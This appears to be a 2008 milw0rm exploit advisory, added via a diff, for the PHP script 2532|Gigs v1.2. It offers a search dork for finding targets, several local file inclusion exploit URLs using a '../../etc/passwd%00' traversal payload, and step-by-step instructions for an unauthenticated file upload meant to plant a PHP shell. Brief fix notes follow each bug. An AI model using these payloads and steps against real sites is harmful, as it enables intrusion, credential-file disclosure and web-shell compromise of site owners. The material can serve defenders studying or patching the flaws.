@@ -1,0 +1,95 @@
+[START]
+
+#########################################################################################
+[0x01] Informations:
+
+Script         : 2532|Gigs v1.2 Stable
+Download       : http://www.hotscripts.com/jump.php?listing_id=65863&jump_type=1
+Dork           : Powered by 2532|Gigs v1.2.2
+Vulnerability  : Local File Inclusion / Remote File Upload
+Author         : Osirys
+Contact        : osirys[at]live[dot]it
+Website        : http://osirys.org
+Notes          : Proud to be Italian
+Greets:        : XaDoS, x0r, emgent, Jay, str0ke, Todd and AlpHaNiX
+
+
+#########################################################################################
+[0x02] Bug: [Multiple Local File Inclusions]
+######
+
+Bugged file is: /[path]/settings.php
+Bugged file is: /[path]/deleteuser.php
+Bugged file is: /[path]/mini_calendar.php
+Bugged file is: /[path]/manage_venues.php
+Bugged file is: /[path]/manage_gigs.php
+
+* There are a lot of other files vulnerable to LFI !
+
+[CODE]
+
+<?php
+/*
+2532|Gigs v1.1
+www.2532gigs.com
+./settings.php
+*/
+
+  // Load the settings.php language file
+  include_once("languages/$language/settings.php");
+
+[/CODE]
+
+settings.php page starts in this way. Includes a non declarate variable -> $language
+
+[!] FIX: Declare $language var.
+
+
+[!] EXPLOIT: /[path]/settings.php?language=[local_file_to_include]
+[!] EXPLOIT: /[path]/deleteuser.php?language=[local_file_to_include]
+[!] EXPLOIT: /[path]/mini_calendar?language=[local_file_to_include]
+[!] EXPLOIT: /[path]/manage_venues.php?language=[local_file_to_include]
+[!] EXPLOIT: /[path]/manage_gigs.php?language=[local_file_to_include]
+                                           ../../../../../../../../../../etc/passwd%00
+
+
+#########################################################################################
+[0x03] Bug: [Remote File Upload]
+######
+
+Bugged file is: /[path]/upload_flyer.php
+
+[CODE]
+
+if (isset($_POST['submitflyer']))
+   {
+   if (strlen($_FILES['banner']['name']) > 0)
+{
+$target = "flyers/".$_FILES['banner']['name'];
+move_uploaded_file($_FILES['banner']['tmp_name'], $target);
+
+// Other code, like it cheeks if /[path]/flyers dir is writable or not !
+
+[/CODE]
+
+As we can see, everyone can upload everything that he wants. There is not login required,
+and there isn't a cheek for the extension of the file that is going to be uploaded.
+So, an unregistered user can upload a file of any extension, like a .php file. Why not
+a php shell ?
+
+[!] FIX: Before the upload script, just cheek if the user is registered, and then allow him
+         only to upload .gif/jpg or the extension you want, not .php or other extensions !
+
+
+[!] EXPLOIT:
+             1) Go to: /path/upload_flyer.php
+             2) Select your local file to upload
+             3) Press submit button
+             4) Cheek your file at: /[path]/flyers/your_local_file.your_extension
+
+
+#########################################################################################
+
+[/END]
+
+# milw0rm.com [2008-12-18]
